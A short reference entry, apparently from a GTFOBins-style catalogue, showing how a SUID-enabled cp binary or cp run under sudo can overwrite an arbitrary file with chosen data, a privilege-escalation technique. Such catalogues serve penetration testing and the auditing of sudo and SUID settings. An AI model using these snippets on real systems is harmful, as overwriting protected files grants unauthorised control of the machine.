---
description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.
functions:
  suid-enabled:
    - code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        ./cp $TF $LFILE
  sudo-enabled:
    - code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        sudo cp $TF $LFILE
---
